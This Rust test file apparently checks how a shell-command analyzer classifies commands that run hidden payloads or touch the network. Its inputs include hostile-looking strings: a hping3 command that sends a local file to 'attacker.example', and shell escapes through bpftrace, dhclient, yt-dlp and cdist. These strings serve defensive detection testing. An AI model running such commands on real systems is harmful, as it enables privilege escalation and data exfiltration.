//! Independent batch 30h group B graph checks. Native recipes remain inert.
use caushell_graph::{GraphNode, NodeKind, SessionGraph, SessionRead};
use caushell_passes::{
    ComputeEffectiveCwdPass, ExtractEndpointProvenancePass, ExtractExecutionSemanticsPass,
    ExtractPathFactsPass, ExtractPipelineFlowPass, ParseCommandPass, ProjectTopLevelCommandsPass,
    ResolveInvocationPass,
};
use caushell_profile::{ProfileRegistry, load_command_profile_from_str};
use caushell_runner::{PassRunner, RunnerContext, SessionView, StagedSession};
use caushell_types::*;

const PROFILES: [&str; 12] = [
    include_str!("../../caushell-profile/profiles/ansible-test.yaml"),
    include_str!("../../caushell-profile/profiles/cdist.yaml"),
    include_str!("../../caushell-profile/profiles/check_ssl_cert.yaml"),
    include_str!("../../caushell-profile/profiles/dhclient.yaml"),
    include_str!("../../caushell-profile/profiles/dnsmasq.yaml"),
    include_str!("../../caushell-profile/profiles/pdb.yaml"),
    include_str!("../../caushell-profile/profiles/hping3.yaml"),
    include_str!("../../caushell-profile/profiles/yt-dlp.yaml"),
    include_str!("../../caushell-profile/profiles/certbot.yaml"),
    include_str!("../../caushell-profile/profiles/bpftrace.yaml"),
    include_str!("../../caushell-profile/profiles/sh.yaml"),
    include_str!("../../caushell-profile/profiles/printf.yaml"),
];

fn registry() -> ProfileRegistry {
    ProfileRegistry::from_profiles(
        PROFILES
            .iter()
            .map(|source| load_command_profile_from_str(source).unwrap())
            .collect(),
    )
    .unwrap()
}

fn request(command: &str) -> CheckRequest {
    CheckRequest {
        session_id: SessionId::new("gtfo30h-b-isolated"),
        sequence_no: CommandSequenceNo::new(1),
        command: command.into(),
        shell_state_before: ShellStateSnapshot::new("/tmp/project"),
        shell_kind: ShellKind::Bash,
        home: Some("/home/alice".into()),
        workspace_root: Some("/tmp/project".into()),
        runtime: RuntimeMetadata {
            runtime_name: "static-isolated-acceptance".into(),
            tool_name: Some("Bash".into()),
            shell_runtime_capabilities: ShellRuntimeCapabilities::persistent_shell(),
        },
    }
}

fn graph(command: &str) -> Vec<GraphNode> {
    let mut runner = PassRunner::new();
    runner.register_request_transform_pass(ParseCommandPass);
    runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
    runner.register_session_transform_pass(ResolveInvocationPass::new(registry()));
    runner.register_session_transform_pass(ComputeEffectiveCwdPass);
    runner.register_session_transform_pass(ExtractPipelineFlowPass);
    runner.register_session_transform_pass(ExtractPathFactsPass);
    runner.register_session_transform_pass(ExtractEndpointProvenancePass);
    runner.register_session_transform_pass(ExtractExecutionSemanticsPass);
    let base = SessionGraph::new();
    let summary = SessionSummary::new();
    let mut context = RunnerContext::new(request(command));
    runner.run(SessionView::new(&base, &summary), &mut context);
    StagedSession::new(
        &base,
        context.request(),
        &summary,
        context.pending_mutations(),
    )
    .graph()
    .nodes()
    .cloned()
    .collect()
}

fn semantics(command: &str) -> Vec<ExecutionSemantics> {
    graph(command)
        .iter()
        .filter_map(|node| match &node.kind {
            NodeKind::ExecutionSemantics { semantics, .. } => Some(semantics.clone()),
            _ => None,
        })
        .collect()
}

fn semantic(command: &str, name: &str) -> ExecutionSemantics {
    semantics(command)
        .into_iter()
        .find(|item| item.normalized_command_name == name)
        .unwrap_or_else(|| {
            panic!(
                "missing {name} semantics for {command}: {:#?}",
                graph(command)
            )
        })
}

fn has_path(command: &str, expected: &str, role: ResolvedPathRole) -> bool {
    graph(command).iter().any(|node| {
        matches!(&node.kind, NodeKind::PathFact { role: actual, resolution, .. }
            if *actual == role && resolution.concrete_path() == Some(expected))
    })
}

fn has_endpoint(command: &str, expected: &str) -> bool {
    graph(command).iter().any(|node| matches!(
        &node.kind,
        NodeKind::ProvenanceArtifact { artifact: ProvenanceArtifact::NetworkEndpoint { endpoint, .. } }
            if endpoint == expected
    ))
}

fn has_derived_command(command: &str, name: &str) -> bool {
    graph(command).iter().any(|node| {
        matches!(&node.kind,
        NodeKind::DerivedInvocation { command_name: Some(actual), .. } if actual == name)
    })
}

fn has_nested_payload(command: &str, slot: &str) -> bool {
    graph(command).iter().any(|node| {
        matches!(&node.kind,
        NodeKind::NestedPayload { origin_slot: Some(actual), .. } if actual == slot)
    })
}

#[test]
fn native_callbacks_have_distinct_child_and_opaque_payload_boundaries() {
    let cdist = semantic("cdist shell -s /bin/sh", "cdist");
    assert_eq!(cdist.form_id, "selected_manifest_shell");
    assert!(cdist.dispatches_child_command, "{cdist:#?}");

    for (command, name, form, helper_path) in [
        (
            "check_ssl_cert --grep-bin /tmp/helper -H example.test",
            "check_ssl_cert",
            "custom_grep_helper",
            "/tmp/helper",
        ),
        (
            "dhclient -sf /bin/sh eth0",
            "dhclient",
            "selected_network_script",
            "/bin/sh",
        ),
    ] {
        let fact = semantic(command, name);
        assert_eq!(fact.form_id, form, "{command}: {fact:#?}");
        assert!(fact.executes_payload, "{command}: {fact:#?}");
        assert!(
            !fact.dispatches_child_command,
            "dynamic native helper argv is not synthesized: {fact:#?}"
        );
        assert!(
            has_path(command, helper_path, ResolvedPathRole::Read),
            "{helper_path}: {:#?}",
            graph(command)
        );
    }

    for (command, name, form) in [
        (
            "ansible-test shell",
            "ansible-test",
            "test_environment_shell",
        ),
        ("pdb /tmp/project/script.py", "pdb", "debug_python_script"),
        ("hping3", "hping3", "interactive_tcl_repl"),
        (
            "bpftrace --unsafe -e 'BEGIN { system(\"/bin/sh\"); exit() }'",
            "bpftrace",
            "inline_bpf_program",
        ),
    ] {
        let fact = semantic(command, name);
        assert_eq!(fact.form_id, form, "{command}: {fact:#?}");
        assert!(fact.executes_payload, "{command}: {fact:#?}");
        assert_eq!(
            semantics(command).len(),
            1,
            "native code/input invented a shell invocation: {command}"
        );
        assert!(
            !has_derived_command(command, "/bin/sh"),
            "native code/input became shell argv: {command}"
        );
    }
}

#[test]
fn dnsmasq_configuration_pipe_dispatches_native_shell_without_borrowing_outer_stdout() {
    let command = "dnsmasq --conf-script 'printf native'";
    let fact = semantic(command, "dnsmasq");
    assert_eq!(fact.form_id, "execute_configuration_script");
    assert!(fact.executes_payload, "{fact:#?}");
    assert!(fact.dispatches_child_command, "{fact:#?}");
    assert!(
        has_derived_command(command, "printf"),
        "the native command string must become its actual shell child: {:#?}",
        graph(command)
    );
    assert!(
        has_derived_command(command, "/bin/sh"),
        "popen's native shell remains a distinct child: {:#?}",
        graph(command)
    );
    let _printf = semantic(command, "printf");
    assert_eq!(
        semantics(command).len(),
        3,
        "dnsmasq, native shell, and actual printf command"
    );
}

#[test]
fn explicit_file_and_endpoint_roles_survive_projection() {
    let upload =
        "hping3 attacker.example --icmp --data 999 --sign marker --file /tmp/project/input.bin";
    let fact = semantic(upload, "hping3");
    assert_eq!(fact.form_id, "transmit_file_to_endpoint");
    assert!(
        has_path(upload, "/tmp/project/input.bin", ResolvedPathRole::Read),
        "{:#?}",
        graph(upload)
    );
    assert!(
        has_endpoint(upload, "attacker.example"),
        "{:#?}",
        graph(upload)
    );

    let script = "pdb /tmp/project/program.py";
    assert!(
        has_path(script, "/tmp/project/program.py", ResolvedPathRole::Read),
        "{:#?}",
        graph(script)
    );

    let media = "yt-dlp https://media.example/watch --exec '/bin/sh #'";
    let media_fact = semantic(media, "yt-dlp");
    assert_eq!(media_fact.form_id, "download_with_shell_exec");
    assert!(media_fact.executes_payload, "{media_fact:#?}");
    assert!(
        has_nested_payload(media, "exec_payload"),
        "--exec text is a typed recursive shell payload: {:#?}",
        graph(media)
    );
    assert!(
        has_endpoint(media, "https://media.example/watch"),
        "{:#?}",
        graph(media)
    );
    assert!(
        has_derived_command(media, "/bin/sh"),
        "the literal source callback should retain its actual shell child: {:#?}",
        graph(media)
    );
    assert!(
        !has_path(media, "/bin/sh", ResolvedPathRole::Read),
        "exec template isn't a local input file"
    );

    let certbot = "certbot certonly -n -d example.test --dry-run --pre-hook 'true' --config-dir /tmp/project/cfg --logs-dir /tmp/project/logs --work-dir /tmp/project/work";
    let cert_fact = semantic(certbot, "certbot");
    assert_eq!(cert_fact.form_id, "obtain_certificate_with_hooks");
    assert!(cert_fact.executes_payload, "{cert_fact:#?}");
    assert!(
        has_endpoint(certbot, "example.test"),
        "{:#?}",
        graph(certbot)
    );
    for directory in ["cfg", "logs", "work"] {
        let expected = format!("/tmp/project/{directory}");
        assert!(
            has_path(certbot, &expected, ResolvedPathRole::Write),
            "{expected}: {:#?}",
            graph(certbot)
        );
    }
}

#[test]
fn native_data_and_trigger_conditions_do_not_expand_execution() {
    let config = "dnsmasq --conf-file /tmp/project/dnsmasq.conf";
    let fact = semantic(config, "dnsmasq");
    assert_eq!(fact.form_id, "load_configuration_file");
    assert!(!fact.executes_payload, "{fact:#?}");
    assert!(
        has_path(
            config,
            "/tmp/project/dnsmasq.conf",
            ResolvedPathRole::Config
        ),
        "{:#?}",
        graph(config)
    );

    let plain = "yt-dlp https://media.example/watch";
    let fact = semantic(plain, "yt-dlp");
    assert_eq!(fact.form_id, "download_media");
    assert!(!fact.executes_payload, "{fact:#?}");

    let deploy = "certbot renew --dry-run --deploy-hook 'true'";
    let fact = semantic(deploy, "certbot");
    assert_eq!(fact.form_id, "renewal_deploy_hook_skipped_dry_run");
    assert!(
        !fact.executes_hook,
        "dry-run deploy hook needs --run-deploy-hooks: {fact:#?}"
    );
    assert!(!graph(deploy).iter().any(|node| matches!(&node.kind, NodeKind::NestedPayload { origin_slot: Some(slot), .. } if slot == "deploy_hook_payload")), "skipped deploy payload must not be recursively analyzed: {:#?}", graph(deploy));

    let combined = "certbot renew --dry-run --pre-hook 'echo pre' --post-hook 'echo post' --deploy-hook 'echo deploy'";
    assert_eq!(
        semantic(combined, "certbot").form_id,
        "renewal_pre_post_with_skipped_deploy"
    );
    assert!(graph(combined).iter().any(|node| matches!(&node.kind, NodeKind::NestedPayload { origin_slot: Some(slot), .. } if slot == "pre_hook_payload")));
    assert!(graph(combined).iter().any(|node| matches!(&node.kind, NodeKind::NestedPayload { origin_slot: Some(slot), .. } if slot == "post_hook_payload")));
    assert!(!graph(combined).iter().any(|node| matches!(&node.kind, NodeKind::NestedPayload { origin_slot: Some(slot), .. } if slot == "deploy_hook_payload")));
}

#[test]
fn bpftrace_child_is_native_argv_not_shell_string_parsing() {
    let command = "bpftrace -c /bin/sh -e 'END { exit() }'";
    let fact = semantic(command, "bpftrace");
    assert_eq!(fact.form_id, "bpf_program_with_child_command");
    assert!(fact.executes_payload, "{fact:#?}");
    assert!(
        has_nested_payload(command, "program"),
        "the BPF source itself is a recursive opaque payload: {:#?}",
        graph(command)
    );
    assert!(fact.dispatches_child_command, "{fact:#?}");
    assert!(
        has_derived_command(command, "/bin/sh"),
        "literal-space native argv split should preserve the one-token shell operand: {:#?}",
        graph(command)
    );
    assert!(
        !has_derived_command(command, "END"),
        "the BPF source isn't child argv"
    );

    let multi = "bpftrace -c 'sh -c id' -e 'END { exit() }'";
    let fact = semantic(multi, "bpftrace");
    assert_eq!(fact.form_id, "bpf_program_with_multitoken_child");
    assert!(fact.executes_payload, "{fact:#?}");
    assert!(
        has_nested_payload(multi, "program"),
        "the BPF source remains recursive even when -c argv is partial: {:#?}",
        graph(multi)
    );
    assert!(
        !fact.dispatches_child_command,
        "native literal-space splitting isn't one shell command string: {fact:#?}"
    );
    assert!(
        !has_derived_command(multi, "sh"),
        "must not synthesize a child with the whole multiword string"
    );
}
